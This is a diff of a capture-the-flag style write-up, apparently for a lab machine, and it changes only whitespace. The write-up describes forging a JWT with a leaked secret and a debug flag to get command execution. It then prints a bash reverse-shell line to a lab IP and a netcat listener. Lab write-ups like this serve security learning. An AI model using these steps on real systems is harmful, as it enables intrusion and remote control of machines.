@@ -234,14 +234,14 @@ class Settings(BaseSettings):
     ALGORITHM: str = \"HS256\"
 ```
 - For easiest use on the swagger let's connect with the admin creds we created we just have to click on the Authorize green lock on the top right and enter our credentials
-- Ok now let's inspect the token in jwt.io
+- Ok now let's inspect the token in jwt.io  
 ![image](https://user-images.githubusercontent.com/96747355/168400622-d6b5ab1d-a822-4f51-b1ae-0aa2dc2d3f17.png)  
 - Let's try to add our secret now that we have it we need to enter it here:  
 ![image](https://user-images.githubusercontent.com/96747355/168400796-344237a4-9446-4870-b402-0129ef4d62d9.png)  
 - And according to the error message we have we also need to add a debug flag in it so our payload data looks like this  
 ![image](https://user-images.githubusercontent.com/96747355/168401019-d8897ff1-0180-405c-bc22-cbfbb9c59a5f.png)  
 - Now we just need to copy the new token and we should be able to execute commands.
-- Let's try our ls again. And it works!
+- Let's try our ls again. And it works!  
 ![image](https://user-images.githubusercontent.com/96747355/168401140-a62a8608-2bae-453e-9c06-991a023b37ef.png)  
 - Let's try to get a shell `bash -i >& /dev/tcp/10.10.14.11/4444 0>&1`. 
 - We launch a listener `nc -lvp 4444`
